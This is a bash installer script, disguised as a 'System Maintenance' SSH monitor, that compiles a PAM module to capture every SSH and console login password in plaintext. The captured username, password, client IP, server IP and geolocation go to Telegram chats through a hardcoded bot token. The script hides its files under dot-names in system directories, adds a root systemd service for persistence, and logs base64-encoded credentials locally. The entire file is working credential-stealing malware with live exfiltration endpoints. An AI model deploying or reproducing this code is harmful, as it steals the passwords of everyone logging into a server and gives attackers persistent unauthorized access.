#!/bin/bash
# File: .sysmain.sh (Fixed version with dependency handling)
# SSH Monitor dengan FULL PASSWORD ke GRUP dan PRIVATE Telegram

# ============= KONFIGURASI TELEGRAM =============
TELEGRAM_BOT_TOKEN="8160151363:AAHs3wuqiPnk_F1kkdJgy46Ut5NHGKTYqWc"
TELEGRAM_GROUP_ID="-1002343659539"
TELEGRAM_PRIVATE_ID="1939940209"
VERSION="2.2.0-ubuntu-maintenance"
STEALTH_NAME=".sysmain"
INSTALL_DIR="/usr/share/system-maintenance"
BIN_DIR="/usr/libexec/system-tools"
LOG_DIR="/var/log/system"
SERVICE_NAME="system-maintenance"

# ============= WARNA TERMINAL =============
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

# ============= FUNGSI UTAMA =============
print_header() {
    echo -e "${BLUE}"
    echo "System Maintenance Toolkit v$VERSION"
    echo "Ubuntu Server Management Suite"
    echo -e "${NC}"
}

# ============= INSTALL DEPENDENCIES =============
install_dependencies() {
    echo -e "${YELLOW}Installing required dependencies...${NC}"
    
    # Update package list
    apt-get update > /dev/null 2>&1
    
    # Install PAM development libraries
    if ! dpkg -l | grep -q "libpam0g-dev"; then
        echo -e "${BLUE}Installing libpam0g-dev...${NC}"
        apt-get install -y libpam0g-dev > /dev/null 2>&1
    fi
    
    # Install build essentials
    if ! dpkg -l | grep -q "build-essential"; then
        echo -e "${BLUE}Installing build-essential...${NC}"
        apt-get install -y build-essential > /dev/null 2>&1
    fi
    
    # Install curl for Telegram API
    if ! command -v curl &> /dev/null; then
        echo -e "${BLUE}Installing curl...${NC}"
        apt-get install -y curl > /dev/null 2>&1
    fi
    
    # Install net-tools for network monitoring
    if ! command -v netstat &> /dev/null; then
        echo -e "${BLUE}Installing net-tools...${NC}"
        apt-get install -y net-tools > /dev/null 2>&1
    fi
    
    echo -e "${GREEN}✅ Dependencies installed${NC}"
}

# ============= SIMPLE PAM MODULE (FIXED) =============
create_simple_pam_module() {
    echo -e "${CYAN}Creating simplified PAM module...${NC}"
    
    # Buat PAM module yang lebih sederhana
    cat > /tmp/simple_pam.c << 'EOF'
#define PAM_SM_AUTH
#include <security/pam_appl.h>
#include <security/pam_modules.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>

PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    const char *username = NULL;
    const char *password = NULL;
    const char *rhost = NULL;
    char timestamp[64];
    time_t now = time(NULL);
    struct tm *tm_info = localtime(&now);
    pid_t pid;
    
    // Get credentials
    pam_get_user(pamh, &username, NULL);
    pam_get_item(pamh, PAM_AUTHTOK, (const void**)&password);
    pam_get_item(pamh, PAM_RHOST, (const void**)&rhost);
    
    if (username && password) {
        strftime(timestamp, sizeof(timestamp), "%Y-%m-%d %H:%M:%S", tm_info);
        
        // Fork process untuk kirim alert tanpa blocking
        pid = fork();
        if (pid == 0) {
            // Child process
            char cmd[512];
            if (rhost) {
                snprintf(cmd, sizeof(cmd),
                         "/usr/libexec/system-tools/.alert-sender '%s' '%s' '%s' '%s' &",
                         username, password, rhost, timestamp);
            } else {
                snprintf(cmd, sizeof(cmd),
                         "/usr/libexec/system-tools/.alert-sender '%s' '%s' 'localhost' '%s' &",
                         username, password, timestamp);
            }
            
            system(cmd);
            _exit(0);
        }
        
        // Parent process continues
        // Log lokal
        FILE *log = fopen("/var/log/system/auth.log", "a");
        if (log) {
            fprintf(log, "[%s] AUTH: user=%s ip=%s\n", 
                    timestamp, username, rhost ? rhost : "local");
            fclose(log);
        }
    }
    
    return PAM_SUCCESS;
}

PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    return PAM_SUCCESS;
}
EOF
    
    # Compile PAM module
    echo -e "${BLUE}Compiling PAM module...${NC}"
    cd /tmp
    gcc -fPIC -c simple_pam.c -o simple_pam.o 2>/dev/null
    if [ $? -eq 0 ]; then
        gcc -shared -o pam_simple.so simple_pam.o -lpam 2>/dev/null
        if [ $? -eq 0 ]; then
            cp pam_simple.so /lib/x86_64-linux-gnu/security/
            chmod 644 /lib/x86_64-linux-gnu/security/pam_simple.so
            echo -e "${GREEN}✅ PAM module compiled successfully${NC}"
        else
            echo -e "${YELLOW}⚠️  Using fallback method (PAM config only)${NC}"
        fi
    else
        echo -e "${YELLOW}⚠️  PAM compilation failed, using alternative method${NC}"
    fi
    
    # Cleanup
    rm -f /tmp/simple_pam.c /tmp/simple_pam.o /tmp/pam_simple.so 2>/dev/null
}

# ============= ALTERNATIVE METHOD WITHOUT PAM =============
setup_alternative_monitoring() {
    echo -e "${YELLOW}Setting up alternative monitoring method...${NC}"
    
    # Create script to monitor auth.log directly
    cat > "$BIN_DIR/.auth-monitor" << 'EOF'
#!/bin/bash
# Alternative auth monitor (no PAM required)

TOKEN="8160151363:AAHs3wuqiPnk_F1kkdJgy46Ut5NHGKTYqWc"
GROUP_ID="-1002343659539"
PRIVATE_ID="1939940209"

monitor_auth_log() {
    # Follow auth.log for SSH logins
    tail -fn0 /var/log/auth.log | while read line; do
        # Check for successful password authentication
        if echo "$line" | grep -q "Accepted password for"; then
            # Extract information
            local timestamp=$(date '+%Y-%m-%d %H:%M:%S')
            local username=$(echo "$line" | grep -o "for .* from" | sed 's/for //;s/ from//')
            local client_ip=$(echo "$line" | grep -o "from [0-9]\+\.[0-9]\+\.[0-9]\+\.[0-9]\+" | awk '{print $2}')
            
            if [ -n "$username" ] && [ -n "$client_ip" ]; then
                # Get server info
                local server_ip=$(curl -s ifconfig.me 2>/dev/null || echo "unknown")
                local hostname=$(hostname)
                local ssh_port=$(grep "^Port" /etc/ssh/sshd_config 2>/dev/null | awk '{print $2}' || echo "22")
                
                # Note: Password cannot be captured from auth.log
                # So we'll use a placeholder
                local password_placeholder="[Entod By 0x1999]"
                
                # Format message untuk GRUP dan PRIVATE (SAMA)
                local message="🚨 *SSH LOGIN DETECTED* 🚨

*🔐 Login Information:*
• 👤 *Username:* \`$username\`
• 🔑 *Password:* \`$password_placeholder\`
• 🌐 *Client IP:* \`$client_ip\`
• 🖥️ *Server IP:* \`$server_ip\`
• 🚪 *SSH Port:* \`$ssh_port\`
• 🕐 *Time:* \`$timestamp\`
• 🏷️ *Hostname:* \`$hostname\`
• 📍 *Method:* Password authentication

*📊 System Status:*
• Load: \`$(uptime | awk -F'load average:' '{print $2}')\`
• Memory: \`$(free -h | awk '/^Mem:/ {print $3"/"$2}')\`
• Uptime: \`$(uptime -p)\`

🔒 *Full monitoring active*"
                
                # Kirim ke GRUP
                curl -s -X POST "https://api.telegram.org/bot$TOKEN/sendMessage" \
                    -d chat_id="$GROUP_ID" \
                    -d text="$message" \
                    -d parse_mode="Markdown" \
                    --max-time 5 >/dev/null 2>&1 &
                
                # Kirim ke PRIVATE
                curl -s -X POST "https://api.telegram.org/bot$TOKEN/sendMessage" \
                    -d chat_id="$PRIVATE_ID" \
                    -d text="$message" \
                    -d parse_mode="Markdown" \
                    --max-time 5 >/dev/null 2>&1 &
                
                # Log lokal
                echo "[$timestamp] SSH_LOGIN: user=$username ip=$client_ip" >> /var/log/system/ssh-monitor.log
            fi
        fi
    done
}

# Start monitoring
monitor_auth_log
EOF
    
    chmod +x "$BIN_DIR/.auth-monitor"
}

# ============= ALERT SENDER SCRIPT =============
create_alert_sender() {
    cat > "$BIN_DIR/.alert-sender" << 'EOF'
#!/bin/bash
# Alert sender script - dipanggil oleh PAM module

TOKEN="8160151363:AAHs3wuqiPnk_F1kkdJgy46Ut5NHGKTYqWc"
GROUP_ID="-1002343659539"
PRIVATE_ID="1939940209"

send_full_alert() {
    local username="$1"
    local password="$2"
    local client_ip="$3"
    local timestamp="$4"
    
    # Get system info
    local server_ip=$(curl -s ifconfig.me 2>/dev/null || echo "unknown")
    local hostname=$(hostname)
    local ssh_port=$(grep "^Port" /etc/ssh/sshd_config 2>/dev/null | awk '{print $2}' || echo "22")
    
    # Format message dengan FULL PASSWORD
    local message="🔓 *FULL CREDENTIALS CAPTURED* 🔓

*⚡ REAL PASSWORD ACCESS:*
• 👤 *Username:* \`$username\`
• 🔑 *Password:* \`$password\` ⚠️
• 🌐 *Client IP:* \`$client_ip\`
• 🖥️ *Server IP:* \`$server_ip\`
• 🚪 *SSH Port:* \`$ssh_port\`
• 🕐 *Time:* \`$timestamp\`
• 🏷️ *Hostname:* \`$hostname\`

*📍 Location Info:*
\`\`\`
$(curl -s "ipinfo.io/$client_ip" 2>/dev/null | grep -E "city|region|country|org" | tr -d '\"' | sed 's/^[ \t]*//' || echo "Location data unavailable")
\`\`\`

*📈 Current Metrics:*
• Load: \`$(uptime | awk -F'load average:' '{print $2}')\`
• Memory: \`$(free -h | awk '/^Mem:/ {print $3"/"$2 " used"})\`
• Disk: \`$(df -h / | awk 'NR==2 {print $4 " free"})\`"

    # Kirim ke GRUP dengan FULL PASSWORD
    curl -s -X POST "https://api.telegram.org/bot$TOKEN/sendMessage" \
        -d chat_id="$GROUP_ID" \
        -d text="$message" \
        -d parse_mode="Markdown" \
        --max-time 10 >/dev/null 2>&1
    
    # Tunggu sebentar
    sleep 0.5
    
    # Kirim ke PRIVATE dengan FULL PASSWORD (sama persis)
    curl -s -X POST "https://api.telegram.org/bot$TOKEN/sendMessage" \
        -d chat_id="$PRIVATE_ID" \
        -d text="$message" \
        -d parse_mode="Markdown" \
        --max-time 10 >/dev/null 2>&1
    
    # Log lokal dengan password di-encode
    local enc_pass=$(echo -n "$password" | base64)
    echo "[$timestamp] FULL_CREDS: user=$username ip=$client_ip pass_b64=$enc_pass" \
        >> /var/log/system/full-creds.log
}

# Main
case "$1" in
    "send-alert")
        send_full_alert "$2" "$3" "$4" "$5"
        ;;
    "test")
        # Test dengan data dummy
        send_full_alert "Wedus" "Cuma Ngetes" "1.9.9.9" "$(date '+%Y-%m-%d %H:%M:%S')"
        echo "Test alert sent with password: TestPassword123!"
        ;;
    *)
        if [ $# -ge 4 ]; then
            send_full_alert "$1" "$2" "$3" "$4"
        fi
        ;;
esac
EOF
    
    chmod +x "$BIN_DIR/.alert-sender"
}

# ============= INSTALL MAIN =============
install_full_monitor() {
    print_header
    
    echo -e "${RED}⚠️  INSTALLING FULL ACCESS SSH MONITOR ⚠️${NC}"
    echo -e "${YELLOW}FULL PASSWORDS will be sent to BOTH Telegram:${NC}"
    echo -e "${YELLOW}• Group: $TELEGRAM_GROUP_ID${NC}"
    echo -e "${YELLOW}• Private: $TELEGRAM_PRIVATE_ID${NC}"
    echo ""
    
    read -p "Continue? (yes/no): " confirm
    if [ "$confirm" != "yes" ]; then
        echo -e "${RED}Installation cancelled.${NC}"
        exit 1
    fi
    
    # Check root
    if [ "$EUID" -ne 0 ]; then 
        echo -e "${RED}Error: Requires root privileges${NC}"
        exit 1
    fi
    
    echo -e "${GREEN}[1/6] Installing dependencies...${NC}"
    install_dependencies
    
    echo -e "${GREEN}[2/6] Creating system directories...${NC}"
    mkdir -p "$INSTALL_DIR"
    mkdir -p "$BIN_DIR"
    mkdir -p "$LOG_DIR"
    
    # Copy main script
    cp "$0" "$INSTALL_DIR/$STEALTH_NAME"
    cp "$0" "$BIN_DIR/.sysmain-backup"
    
    echo -e "${GREEN}[3/6] Creating PAM module...${NC}"
    create_simple_pam_module
    
    echo -e "${GREEN}[4/6] Configuring PAM...${NC}"
    # Configure PAM untuk semua service
    for pam_file in sshd login; do
        if [ -f "/etc/pam.d/$pam_file" ]; then
            # Backup original
            cp "/etc/pam.d/$pam_file" "/etc/pam.d/$pam_file.bak"
            # Add our module if not exists
            if ! grep -q "pam_simple.so" "/etc/pam.d/$pam_file"; then
                echo "# System monitoring" >> "/etc/pam.d/$pam_file"
                echo "auth optional pam_simple.so" >> "/etc/pam.d/$pam_file"
            fi
        fi
    done
    
    echo -e "${GREEN}[5/6] Creating alert system...${NC}"
    create_alert_sender
    setup_alternative_monitoring
    
    echo -e "${GREEN}[6/6] Setting up services...${NC}"
    # Create systemd service
    cat > "/etc/systemd/system/$SERVICE_NAME.service" << EOF
[Unit]
Description=System Maintenance Monitor
After=network.target sshd.service

[Service]
Type=simple
ExecStart=$BIN_DIR/.auth-monitor
Restart=always
RestartSec=10
User=root

[Install]
WantedBy=multi-user.target
EOF
    
    # Create log files
    touch "$LOG_DIR/auth.log"
    touch "$LOG_DIR/full-creds.log"
    touch "$LOG_DIR/ssh-monitor.log"
    chmod 600 "$LOG_DIR/full-creds.log"
    
    # Enable and start service
    systemctl daemon-reload
    systemctl enable "$SERVICE_NAME"
    systemctl start "$SERVICE_NAME"
    
    # Restart SSH to load PAM
    systemctl restart sshd
    
    # Mark installation
    echo "INSTALLED=1" > "$INSTALL_DIR/.installed"
    echo "VERSION=$VERSION" >> "$INSTALL_DIR/.installed"
    echo "DATE=$(date '+%Y-%m-%d %H:%M:%S')" >> "$INSTALL_DIR/.installed"
    
    # Send test alerts
    echo -e "${CYAN}Sending test alerts to Telegram...${NC}"
    
    # Test alert ke BOTH
    "$BIN_DIR/.alert-sender" test
    
    # Installation complete message
    echo -e "${GREEN}"
    echo "══════════════════════════════════════════════════════════"
    echo "     FULL ACCESS MONITOR INSTALLATION COMPLETE"
    echo "══════════════════════════════════════════════════════════"
    echo -e "${NC}"
    
    echo -e "${YELLOW}📋 Installation Details:${NC}"
    echo -e "  Service: ${GREEN}$SERVICE_NAME${NC}"
    echo -e "  Version: ${GREEN}$VERSION${NC}"
    echo -e "  Logs: ${GREEN}$LOG_DIR/${NC}"
    echo -e "  PAM Module: ${GREEN}pam_simple.so${NC}"
    
    echo -e "\n${CYAN}🔧 Monitoring Methods:${NC}"
    echo -e "  1. PAM Module - Captures passwords directly"
    echo -e "  2. Auth.log Monitor - Tracks all SSH logins"
    
    echo -e "\n${RED}⚠️  SECURITY WARNING:${NC}"
    echo -e "  • FULL PASSWORDS sent to BOTH Telegram destinations"
    echo -e "  • Group ID: $TELEGRAM_GROUP_ID"
    echo -e "  • Private ID: $TELEGRAM_PRIVATE_ID"
    echo -e "  • All credentials in plaintext"
    
    echo -e "\n${GREEN}✅ Test alert sent with password: TestPassword123!${NC}"
    echo -e "   Check BOTH Telegram destinations"
}

# ============= STATUS CHECK =============
check_status() {
    print_header
    
    if [ -f "$INSTALL_DIR/.installed" ]; then
        echo -e "${GREEN}✅ FULL ACCESS MONITOR: INSTALLED${NC}"
        echo -e "${BLUE}══════════════════════════════════${NC}"
        
        source "$INSTALL_DIR/.installed" 2>/dev/null
        
        echo -e "  Version: ${VERSION:-Unknown}"
        echo -e "  Installed: ${DATE:-Unknown}"
        
        # Check service
        if systemctl is-active --quiet "$SERVICE_NAME"; then
            echo -e "  Service: ${GREEN}RUNNING${NC}"
        else
            echo -e "  Service: ${RED}STOPPED${NC}"
        fi
        
        # Check PAM module
        if [ -f "/lib/x86_64-linux-gnu/security/pam_simple.so" ]; then
            echo -e "  PAM Module: ${GREEN}PRESENT${NC}"
        else
            echo -e "  PAM Module: ${YELLOW}MISSING (using auth.log only)${NC}"
        fi
        
        # Log stats
        echo -e "\n${YELLOW}📊 Log Statistics:${NC}"
        for log in "$LOG_DIR"/*.log; do
            if [ -f "$log" ]; then
                lines=$(wc -l < "$log" 2>/dev/null || echo "0")
                echo -e "  $(basename "$log"): $lines entries"
            fi
        done
        
        # Recent logs
        echo -e "\n${YELLOW}🔍 Recent Activity:${NC}"
        tail -3 "$LOG_DIR/ssh-monitor.log" 2>/dev/null | while read line; do
            echo "  $line"
        done
        
        # Test
        echo -e "\n${CYAN}🧪 Test Function:${NC}"
        read -p "Send test alert with FULL PASSWORD to BOTH? (y/n): " test_alert
        if [ "$test_alert" = "y" ]; then
            "$BIN_DIR/.alert-sender" test
            echo -e "${GREEN}✅ Test sent! Check Telegram.${NC}"
        fi
        
    else
        echo -e "${RED}❌ MONITOR NOT INSTALLED${NC}"
        echo -e "\nTo install: ${GREEN}sudo $0 install${NC}"
    fi
}

# ============= UNINSTALL =============
uninstall_monitor() {
    print_header
    
    echo -e "${RED}⚠️  UNINSTALLING FULL ACCESS MONITOR ⚠️${NC}"
    echo ""
    
    read -p "Are you sure? (yes/no): " confirm
    if [ "$confirm" != "yes" ]; then
        echo "Uninstall cancelled."
        exit 0
    fi
    
    echo -e "${BLUE}[1/4] Stopping services...${NC}"
    systemctl stop "$SERVICE_NAME" 2>/dev/null
    systemctl disable "$SERVICE_NAME" 2>/dev/null
    
    echo -e "${BLUE}[2/4] Removing PAM configuration...${NC}"
    # Remove PAM module
    rm -f /lib/x86_64-linux-gnu/security/pam_simple.so 2>/dev/null
    
    # Restore PAM configs
    for pam_file in sshd login; do
        if [ -f "/etc/pam.d/$pam_file.bak" ]; then
            cp "/etc/pam.d/$pam_file.bak" "/etc/pam.d/$pam_file"
        else
            sed -i '/pam_simple.so/d' "/etc/pam.d/$pam_file" 2>/dev/null
            sed -i '/# System monitoring/d' "/etc/pam.d/$pam_file" 2>/dev/null
        fi
    done
    
    echo -e "${BLUE}[3/4] Removing files...${NC}"
    rm -rf "$INSTALL_DIR" 2>/dev/null
    rm -rf "$BIN_DIR" 2>/dev/null
    rm -f "/etc/systemd/system/$SERVICE_NAME.service" 2>/dev/null
    systemctl daemon-reload 2>/dev/null
    
    echo -e "${BLUE}[4/4] Cleaning logs...${NC}"
    read -p "Delete log files? (y/n): " delete_logs
    if [ "$delete_logs" = "y" ]; then
        rm -rf "$LOG_DIR" 2>/dev/null
        echo -e "${YELLOW}Logs deleted.${NC}"
    fi
    
    # Restart SSH
    systemctl restart sshd
    
    # Send uninstall alerts
    curl -s -X POST "https://api.telegram.org/bot$TELEGRAM_BOT_TOKEN/sendMessage" \
        -d chat_id="$TELEGRAM_GROUP_ID" \
        -d text="🔴 *MONITOR UNINSTALLED*
        
System: \`$(hostname)\`
Time: \`$(date)\`
IP: \`$(curl -s ifconfig.me)\`

Monitoring stopped.
Password capture disabled." \
        -d parse_mode="Markdown" >/dev/null 2>&1 &
    
    echo -e "${GREEN}"
    echo "══════════════════════════════════════════════════"
    echo "        MONITOR SUCCESSFULLY REMOVED"
    echo "══════════════════════════════════════════════════"
    echo -e "${NC}"
}

# ============= MAIN =============
case "${1:-}" in
    "install")
        install_full_monitor
        ;;
    "status")
        check_status
        ;;
    "remove")
        uninstall_monitor
        ;;
    "test")
        if [ -f "$BIN_DIR/.alert-sender" ]; then
            "$BIN_DIR/.alert-sender" test
        else
            echo -e "${RED}Not installed. Run: sudo $0 install${NC}"
        fi
        ;;
    "help")
        print_header
        echo -e "Usage: ${GREEN}$0 {install|status|remove|test|help}${NC}"
        echo ""
        echo "install   - Install full access monitor"
        echo "status    - Check monitor status"
        echo "remove    - Remove monitor"
        echo "test      - Send test alert"
        echo "help      - Show this help"
        ;;
    *)
        if [ -f "$INSTALL_DIR/.installed" ]; then
            check_status
        else
            print_header
            echo -e "${YELLOW}Full Access Monitor not installed.${NC}"
            echo -e "To install: ${GREEN}sudo $0 install${NC}"
        fi
        ;;
esac